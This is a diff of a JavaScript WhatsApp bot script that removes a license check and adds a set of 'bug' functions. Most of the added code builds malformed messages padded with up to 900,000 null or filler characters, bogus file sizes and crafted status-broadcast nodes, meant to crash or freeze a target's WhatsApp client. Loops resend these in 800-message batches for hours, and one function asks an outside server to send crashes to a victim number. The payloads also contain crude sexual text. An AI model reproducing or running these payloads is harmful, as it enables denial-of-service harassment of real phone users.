@@ -208,23 +208,6 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 		);
 		// STRING \\
 		//=================================================//
-		const DB = 'https://raw.githubusercontent.com/khalid-official/bebas-vuy/refs/heads/main/Security';
-		// DATABASE \\
-		//=================================================//
-		async function isBotNumberRegistered(botNumber) {
-			try {
-				const response = await axios.get(DB);
-				if (!Array.isArray(response.data)) {
-					console.error('Data Yang Diterima Tidak Valid: Harus Berupa Array.');
-					return false;
-				}
-				const registeredBotNumbers = response.data;
-				return registeredBotNumbers.includes(botNumber);
-			} catch (error) {
-				console.error('Error Fetching Registered Bot Numbers:', error.message);
-				return false;
-			}
-		}
 		//=================================================//
 		const {
 			groupMembers
@@ -232,7 +215,6 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 		var budy = (typeof m.text == "string" ? m.text : "")
 		const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/;
 		const botNumber = await VxoZap.decodeJid(VxoZap.user.id)
-		const isBotRegistered = await isBotNumberRegistered(botNumber);
 		if (Object.keys(db.data.settings).includes(botNumber) && Object.keys(db.data.settings[botNumber]).includes("setPrefix") && db.data.settings[botNumber].setPrefix == "multi") {
 			var thePrefix = "𝐌𝐔𝐋𝐓𝐈"
 			var prefix = body.startsWith("#") ? "#" : body.startsWith("!") ? "!" : body.startsWith("/") ? "/" : body.startsWith("?") ? "?" : "."
@@ -332,7 +314,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 				if (!("autobio" in setting)) setting.autobio = false
 				if (!("autoread" in setting)) setting.autoread = false
 				if (!("autoTyping" in setting)) setting.autoTyping = false
-				if (!("autoRecord" in setting)) setting.autoRecord = false
+				if (!("autoRecord" in setting)) setting.autoRecord = true
 				if (!("autoButton" in setting)) setting.autoButton = true
 				if (!("public" in setting)) setting.public = false
 				if (!("setPrefix" in setting)) setting.setPrefix = "multi" //multi, no, all
@@ -342,7 +324,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 				stock: 10,
 				autobio: false,
 				autoTyping: false,
-				autoRecord: false,
+				autoRecord: true,
 				autoButton: true,
 				public: false,
 				setPrefix: "all", //multi, no, all
@@ -371,11 +353,12 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 		//=================================================//
 		// IMAGE URL \\		
 		const images = [
-		    "https://files.catbox.moe/8ehkk3.jpg",
-		    "https://files.catbox.moe/2krxxm.jpg",
-		    "https://files.catbox.moe/5u72ck.jpg",
-		    "https://files.catbox.moe/apim8f.jpg",
-		    "https://files.catbox.moe/phg56y.jpg",
+			"https://files.catbox.moe/ko03m2.jpg",
+			"https://files.catbox.moe/8ehkk3.jpg",
+			"https://files.catbox.moe/2krxxm.jpg",
+			"https://files.catbox.moe/5u72ck.jpg",
+			"https://files.catbox.moe/apim8f.jpg",
+			"https://files.catbox.moe/phg56y.jpg",
 			"https://telegra.ph/file/e6e5a3bbe152c54f6ac65.jpg",
 			"https://telegra.ph/file/4063a5ab22fa48d09a428.jpg",
 			"https://files.catbox.moe/cdoqzh.jpg",
@@ -475,7 +458,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 			let setting = db.data.settings[botNumber]
 			if (new Date() * 1 - setting.status > 1000) {
 				let uptime = await runtime(process.uptime())
-				await VxoZap.updateProfileStatus(`Client By : AkmalMods〽️ || Runtime : ${uptime}`)
+				await VxoZap.updateProfileStatus(`Client By : TheGetsuzoZhiro〽️ || Runtime : ${uptime}`)
 				setting.status = new Date() * 1
 			}
 		}
@@ -520,15 +503,713 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 		//FUNCTION BUG\\
 		//=================================================//
 		// BY GETSUZO \\
+		
+		// NEW BUG INVISIBLE X SW \\
+		// DATE FEBRUARI \\
+		async function InVisibleX(X, show) {
+            let msg = await generateWAMessageFromContent(X, {
+                buttonsMessage: {
+                    text: "🩸",
+                    contentText:
+                        "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
+                    footerText: "𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
+                    buttons: [
+                        {
+                            buttonId: ".aboutb",
+                            buttonText: {
+                                displayText: "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉" + "\u0000".repeat(500000),
+                            },
+                            type: 1,
+                        },
+                    ],
+                    headerType: 1,
+                },
+            }, {});
+        
+            await VxoZap.relayMessage("status@broadcast", msg.message, {
+                messageId: msg.key.id,
+                statusJidList: [X],
+                additionalNodes: [
+                    {
+                        tag: "meta",
+                        attrs: {},
+                        content: [
+                            {
+                                tag: "mentioned_users",
+                                attrs: {},
+                                content: [
+                                    {
+                                        tag: "to",
+                                        attrs: { jid: X },
+                                        content: undefined,
+                                    },
+                                ],
+                            },
+                        ],
+                    },
+                ],
+            });
+        
+            if (show) {
+                await VxoZap.relayMessage(
+                    X,
+                    {
+                        groupStatusMentionMessage: {
+                            message: {
+                                protocolMessage: {
+                                    key: msg.key,
+                                    type: 25,
+                                },
+                            },
+                        },
+                    },
+                    {
+                        additionalNodes: [
+                            {
+                                tag: "meta",
+                                attrs: {
+                                    is_status_mention: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
+                                },
+                                content: undefined,
+                            },
+                        ],
+                    }
+                );
+            }            
+        }
+        async function EpUi(X, ptcp = true) {
+            let msg = await generateWAMessageFromContent(X, {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: {
+                            header: {
+                                title: "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉",
+                                hasMediaAttachment: false
+                            },
+                            body: {
+                                text: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*" + "ꦾ".repeat(50000),
+                            },
+                            nativeFlowMessage: {
+                                messageParamsJson: "",
+                                buttons: [{
+                                        name: "cta_url",
+                                        buttonParamsJson: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*"
+                                    },
+                                    {
+                                        name: "call_permission_request",
+                                        buttonParamsJson: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*"
+                                    }
+                                ]
+                            }
+                        }
+                    }
+                }
+            }, {});            
+            await VxoZap.relayMessage(X, msg.message, ptcp ? {
+				participant: {
+					jid: X
+				}
+			} : {});
+            console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
+        }
+        async function EpHemeral(X, ptcp = true) {
+            let msg = await generateWAMessageFromContent(X, {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: {
+                            header: {
+                                title: "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉",
+                                hasMediaAttachment: false
+                            },
+                            body: {
+                                text: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*"
+                            },
+                            nativeFlowMessage: {
+                                messageParamsJson: "",
+                                buttons: [{
+                                        name: "cta_url",
+                                        buttonParamsJson: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*"
+                                    },
+                                    {
+                                        name: "call_permission_request",
+                                        buttonParamsJson: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*"
+                                    }
+                                ]
+                            }
+                        }
+                    }
+                }
+            }, {});            
+            await VxoZap.relayMessage(X, msg.message, ptcp ? {
+				participant: {
+					jid: X
+				}
+			} : {});
+            console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
+        }
+        async function sendMessagesForDuration(durationHours, X) {
+    const totalDurationMs = durationHours * 60 * 60 * 1000; // Konversi jam ke milidetik
+    const startTime = Date.now();
+    let count = 0;
+
+    const sendNext = async () => {
+        if (Date.now() - startTime >= totalDurationMs) {
+            console.log("Pengiriman Selesai Sesuai Durasi Yang Ditentukan.");
+            return;
+        }
+
+        if (count < 800) {
+            await DelayInVis(X, false); // Menggunakan X dari input pengguna
+            count++;
+            sendNext(); // Melanjutkan pengiriman tanpa delay antar pesan
+        } else {
+            console.log(chalk.green(`Selesai Mengirimkan 800 Paket Ke ${X}`)); // Log selesai kirim 800 paket
+            count = 0; // Reset untuk paket berikutnya
+            console.log(chalk.red("Menyiapkan Untuk Mengirim 800 Paket Berikutnya..."));
+            setTimeout(sendNext, 5000); // Jeda 5 detik setelah selesai batch 800 pesan
+        }
+    };
+
+    sendNext();
+};
+
+async function sendMessagesForDurationX(durationHours, X) {
+    const totalDurationMs = durationHours * 60 * 60 * 1000; // Konversi jam ke milidetik
+    const startTime = Date.now();
+    let count = 0;
+
+    const sendNext = async () => {
+        if (Date.now() - startTime >= totalDurationMs) {
+            console.log("Pengiriman Selesai Sesuai Durasi Yang Ditentukan.");
+            return;
+        }
+
+        if (count < 800) {
+            await InVisibleX(X, false); // Menggunakan X dari input pengguna
+            count++;
+            console.log(chalk.red(`Mengirimkan Paket ${count}/800 ke ${X}`));
+            sendNext(); // Melanjutkan pengiriman
+        } else {
+            console.log(chalk.green(`Selesai Mengirimkan 800 Paket Ke ${X}`)); // Log selesai kirim 800 paket
+            count = 0; // Reset untuk paket berikutnya
+            console.log(chalk.red("Menyiapkan Untuk Mengirim 800 Paket Berikutnya..."));
+            setTimeout(sendNext, 5000); // Jeda 5 detik setelah selesai batch 800 pesan
+        }
+    };
+
+    sendNext();
+};
+
+        async function DelayInVis(X, show) {
+            let push = [];
+                push.push({
+                    body: proto.Message.InteractiveMessage.Body.fromObject({ text: " " }),
+                    footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: " " }),
+                    header: proto.Message.InteractiveMessage.Header.fromObject({
+                        title: " ",
+                        hasMediaAttachment: true,
+                        imageMessage: {
+                            url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
+                            mimetype: "image/jpeg",
+                            fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
+                            fileLength: "18352",
+                            height: 720,
+                            width: 1280,
+                            mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
+                            fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
+                            directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
+                            mediaKeyTimestamp: "1737281900",
+                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
+                            scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
+                            scanLengths: [3537, 10557, 1905, 2353],
+                            midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
+                        },
+                    }),
+                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] }),
+                });
+        
+            let msg = await generateWAMessageFromContent(
+                X,
+                {
+                    viewOnceMessage: {
+                        message: {
+                            messageContextInfo: {
+                                deviceListMetadata: {},
+                                deviceListMetadataVersion: 2,
+                            },
+                            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
+                                body: proto.Message.InteractiveMessage.Body.create({ text: " " }),
+                                footer: proto.Message.InteractiveMessage.Footer.create({ text: "bijiku" }),
+                                header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
+                                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: [...push] }),
+                            }),
+                        },
+                    },
+                },
+                {}
+            );
+        
+            await VxoZap.relayMessage("status@broadcast", msg.message, {
+                messageId: msg.key.id,
+                statusJidList: [X],
+                additionalNodes: [
+                    {
+                        tag: "meta",
+                        attrs: {},
+                        content: [
+                            {
+                                tag: "mentioned_users",
+                                attrs: {},
+                                content: [
+                                    {
+                                        tag: "to",
+                                        attrs: { jid: X },
+                                        content: undefined,
+                                    },
+                                ],
+                            },
+                        ],
+                    },
+                ],
+            });
+        
+            if (show) {
+                await VxoZap.relayMessage(
+                    X,
+                    {
+                        groupStatusMentionMessage: {
+                            message: {
+                                protocolMessage: {
+                                    key: msg.key,
+                                    type: 25,
+                                },
+                            },
+                        },
+                    },
+                    {
+                        additionalNodes: [
+                            {
+                                tag: "meta",
+                                attrs: { is_status_mention: "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉" },
+                                content: undefined,
+                            },
+                        ],
+                    }
+                );
+            }
+        }
+        //=================================================//
+
+		// NEW BUG 2025 HAX \\
+		//QUOTED\\
+		const CrSql = {
+			key: {
+				remoteJid: 'status@broadcast',
+				fromMe: false,
+				participant: '0@s.whatsapp.net',
+			},
+			message: {
+				buttonsMessage: {
+					documentMessage: {
+						url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
+						mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+						fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
+						fileLength: "9999999999999",
+						pageCount: 3567587327,
+						mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
+						fileName: "🩸⃟⃨〫⃰‣ ⁖𝐃͢𝚺𝐕𝚹𝐑𝐒𝐢͢𝚾𝐂𝚹𝐑͢𝚺 ‣—",
+						fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
+						directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
+						mediaKeyTimestamp: "1735456100",
+						contactVcard: true,
+						caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi",
+					},
+					contentText: "༑ Fail Beta - ( devorsixcore ) \"👋\"",
+					footerText: "©️ running since 2020 to 20##?",
+					buttons: [{
+						buttonId: "\u0000".repeat(900000),
+						buttonText: {
+							displayText: "𐎟 𝐓𝐝͢𝐗 ⿻ 𝐂͢𝐋𝐢𝚵͢𝐍𝐓͢ 𐎟",
+						},
+						type: 1,
+					}, ],
+					headerType: 3,
+				},
+			},
+		}
+
+		const CrSqlF = {
+			key: {
+				remoteJid: 'status@broadcast',
+				fromMe: false,
+				participant: '0@s.whatsapp.net',
+			},
+			message: {
+				buttonsMessage: {
+					documentMessage: {
+						url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
+						mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+						fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
+						fileLength: "9999999999999",
+						pageCount: 3567587327,
+						mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
+						fileName: "🩸⃟⃨〫⃰‣ ⁖𝐃͢𝚺𝐕𝚹𝐑𝐒𝐢͢𝚾𝐂𝚹𝐑͢𝚺 ‣—",
+						fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
+						directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
+						mediaKeyTimestamp: "1735456100",
+						contactVcard: true,
+						caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi",
+					},
+					contentText: "༑ Fail Beta - ( devorsixcore ) \"👋\"",
+					footerText: "©️ running since 2020 to 20##?",
+					buttons: [{
+						buttonId: "\u0000".repeat(350000),
+						buttonText: {
+							displayText: "𐎟 𝐓𝐝͢𝐗 ⿻ 𝐂͢𝐋𝐢𝚵͢𝐍𝐓͢ 𐎟",
+						},
+						type: 1,
+					}, ],
+					headerType: 3,
+				},
+			},
+		}
+
+		//FUNCTION\\
+		async function HoldKey(X) {
+			VxoZap.sendMessage(X, {
+				text: "k",
+				contextInfo: {
+					forwardingScore: 999999,
+					isForwarded: true,
+					quotedAd: {
+						advertiserName: " x ",
+						mediaType: "IMAGE",
+						jpegThumbnail: GetsuZo,
+						caption: " x "
+					},
+					placeholderKey: {
+						remoteJid: "0@s.whatsapp.net",
+						fromMe: false,
+						id: "ABCDEF1234567890"
+					}
+				}
+			}, {
+				quoted: m
+			})
+		}
+		async function InteractiveSQLRelay(X, KeyS, Amount, ptcp = true) {
+			let msg = await generateWAMessageFromContent(X, {
+				viewOnceMessage: {
+					message: {
+						interactiveMessage: {
+							header: {
+								title: "",
+								hasMediaAttachment: false
+							},
+							body: {
+								text: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤" + "ꦾ".repeat(Amount),
+							},
+							nativeFlowMessage: {
+								messageParamsJson: "",
+								buttons: [{
+										name: "single_select",
+										buttonParamsJson: "zero"
+									},
+									{
+										name: "galaxy_message",
+										buttonParamsJson: `{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\":)\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}`
+									},
+									{
+										name: "call_permission_request",
+										buttonParamsJson: `{}`
+									},
+								]
+							}
+						}
+					}
+				}
+			}, {
+				userJid: X,
+				quoted: KeyS
+			});
+            await VxoZap.relayMessage(X, msg.message, ptcp ? {
+				participant: {
+					jid: X
+				}
+			} : {});					
+			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
+		};
+		async function CrNoQtd(X) {
+			await VxoZap.sendMessage(X, {
+				image: GetsuZo,
+				thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
+				thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
+				thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
+				jpegThumbnail: GetsuZo,
+				fileLength: "9999999999999",
+				contextInfo: {
+					forwardingScore: 555,
+					isForwarded: true,
+					externalAdReply: {
+						showAdAttribution: false,
+						renderLargerThumbnail: false,
+						title: "! 𝖽𝖾𝗏𝗈𝗋𝗌𝖾𝗅𝗌 - \"𝗋34\" 🩸",
+						body: "https://rule34.com",
+						previewType: "VIDEO",
+						mediaType: "VIDEO",
+						thumbnail: GetsuZo,
+						sourceUrl: "t.me/devor6core",
+						mediaUrl: "t.me/devor6core",
+						sourceType: " x ",
+						sourceId: " x ",
+						containsAutoReply: true,
+						ctwaClid: "ctwa_clid_example",
+						ref: "ref_example"
+					},
+					quotedAd: {
+						advertiserName: " X ",
+						mediaType: "IMAGE",
+						jpegThumbnail: GetsuZo,
+						caption: " X "
+					},
+					placeholderKey: {
+						remoteJid: "0@s.whatsapp.net",
+						fromMe: false,
+						id: "ABCDEF1234567890"
+					},
+					isSampled: false,
+					utm: {
+						utmSource: " X ",
+						utmCampaign: " X "
+					},
+					forwardedNewsletterMessageInfo: {
+						newsletterJid: "6287888888888-1234567890@g.us",
+						serverMessageId: 1,
+						newsletterName: " X ",
+						contentType: "UPDATE",
+						accessibilityText: " X "
+					},
+				},
+				caption: "Hallo!!",
+				footer: "©2025",
+				buttons: [{
+						buttonId: "button1",
+						buttonText: {
+							displayText: "𐎟 𝐓𝐝͢𝐗 ⿻ 𝐂͢𝐋𝐢𝚵͢𝐍𝐓͢ 𐎟" + "\u0000".repeat(600000)
+						},
+						type: 1
+					},
+					{
+						buttonId: "button2",
+						buttonText: {
+							displayText: ` TrashDex 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)} ${"‎‎‎‎‎‎‎‎‎‎‎‎ ".repeat(1)} ${"‎‎‎‎‎‎‎‎‎‎‎‎؂ن؃؄ٽ؂ن؃؄ٽ؂ن؃؄".repeat(4500)}`
+						},
+						type: 1
+					},
+				],
+				contactVcard: true,
+				viewOnce: true,
+				isLive: true,
+				headerType: 6
+			}, {
+				quoted: {
+					key: {
+						participant: "0@s.whatsapp.net",
+						remoteJid: "status@broadcast"
+					},
+					message: {
+						orderMessage: {
+							itemCount: 999999999,
+							status: 1,
+							surface: 2,
+							orderTitle: "𐎟 𝐓𝐝͢𝐗 ⿻ 𝐂͢𝐋𝐢𝚵͢𝐍𝐓͢ 𐎟",
+							sellerJid: "0@s.whatsapp.net"
+						}
+					}
+				}
+			});
+			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
+		}
+		async function CrQtd(target) {
+			const stanza = [{
+					attrs: {
+						biz_bot: '1'
+					},
+					tag: "bot",
+				},
+				{
+					attrs: {},
+					tag: "biz",
+				},
+			];
+
+			let messagePayload = {
+				viewOnceMessage: {
+					message: {
+						listResponseMessage: {
+							title: "Meta Ai" + "ꦽ".repeat(45000),
+							listType: 2,
+							singleSelectReply: {
+								selectedRowId: "🩸"
+							},
+							contextInfo: {
+								stanzaId: VxoZap.generateMessageTag(),
+								participant: "0@s.whatsapp.net",
+								remoteJid: "status@broadcast",
+								mentionedJid: [target, "13135550002@s.whatsapp.net"],
+								quotedMessage: {
+									buttonsMessage: {
+										documentMessage: {
+											url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
+											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+											fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
+											fileLength: "9999999999999",
+											pageCount: 3567587327,
+											mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
+											fileName: "Meta Ai",
+											fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
+											directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
+											mediaKeyTimestamp: "1735456100",
+											contactVcard: true,
+											caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
+										},
+										contentText: "༑ Fail Beta - ( devorsixcore ) \"👋\"",
+										footerText: "© running since 2020 to 20##?",
+										buttons: [{
+											buttonId: "\u0000".repeat(850000),
+											buttonText: {
+												displayText: "𐎟 𝐓𝐝͢𝐗 ⿻ 𝐂͢𝐋𝐢𝚵͢𝐍𝐓͢ 𐎟"
+											},
+											type: 1
+										}],
+										headerType: 3
+									}
+								},
+								conversionSource: "porn",
+								conversionData: crypto.randomBytes(16),
+								conversionDelaySeconds: 9999,
+								forwardingScore: 999999,
+								isForwarded: true,
+								quotedAd: {
+									advertiserName: " x ",
+									mediaType: "IMAGE",
+									jpegThumbnail: GetsuZo,
+									caption: " x "
+								},
+								placeholderKey: {
+									remoteJid: "0@s.whatsapp.net",
+									fromMe: false,
+									id: "ABCDEF1234567890"
+								},
+								expiration: -99999,
+								ephemeralSettingTimestamp: Date.now(),
+								ephemeralSharedSecret: crypto.randomBytes(16),
+								entryPointConversionSource: "kontols",
+								entryPointConversionApp: "kontols",
+								actionLink: {
+									url: "t.me/devor6core",
+									buttonTitle: "konstol"
+								},
+								disappearingMode: {
+									initiator: 1,
+									trigger: 2,
+									initiatorDeviceJid: target,
+									initiatedByMe: true
+								},
+								groupSubject: "kontol",
+								parentGroupJid: "kontolll",
+								trustBannerType: "kontol",
+								trustBannerAction: 99999,
+								isSampled: true,
+								externalAdReply: {
+									title: "! 𝖽𝖾𝗏𝗈𝗋𝗌𝖾𝗅𝗌 - \"𝗋34\" 🩸",
+									mediaType: 2,
+									renderLargerThumbnail: false,
+									showAdAttribution: false,
+									containsAutoReply: false,
+									body: "© running since 2020 to 20##?",
+									thumbnail: GetsuZo,
+									sourceUrl: "go fuck yourself",
+									sourceId: "dvx - problem",
+									ctwaClid: "cta",
+									ref: "ref",
+									clickToWhatsappCall: true,
+									automatedGreetingMessageShown: false,
+									greetingMessageBody: "kontol",
+									ctaPayload: "cta",
+									disableNudge: true,
+									originalImageUrl: "konstol"
+								},
+								featureEligibilities: {
+									cannotBeReactedTo: true,
+									cannotBeRanked: true,
+									canRequestFeedback: true
+								},
+								forwardedNewsletterMessageInfo: {
+									newsletterJid: "120363274419384848@newsletter",
+									serverMessageId: 1,
+									newsletterName: `TrashDex 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
+									contentType: 3,
+									accessibilityText: "kontol"
+								},
+								statusAttributionType: 2,
+								utm: {
+									utmSource: "utm",
+									utmCampaign: "utm2"
+								}
+							},
+							description: "by : devorsixcore"
+						},
+						messageContextInfo: {
+							messageSecret: crypto.randomBytes(32),
+							supportPayload: JSON.stringify({
+								version: 2,
+								is_ai_message: true,
+								should_show_system_message: true,
+								ticket_id: crypto.randomBytes(16),
+							}),
+						},
+					}
+				}
+			}
+
+			await VxoZap.relayMessage(target, messagePayload, {
+				additionalNodes: stanza,
+				participant: {
+					jid: target
+				}
+			});
+			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
+		}
+
+		//=================================================//
+
 		async function sendCrash(X) {
 			try {
 				const newcrash = await fetchJson('http://nxf-01.nexfuture.com.br:25579/sendCrash?numero=' + X);
-				console.log(chalk.green("Send Bug By AkmalMods〽️"));
-				console.log(chalk.red("InVisible⚡"));
+				console.log(newcrash);
 			} catch (error) {
 				console.error("Error Fetching Crash:", error);
 			}
 		}
+		async function sendCrashV2(X) {
+			try {
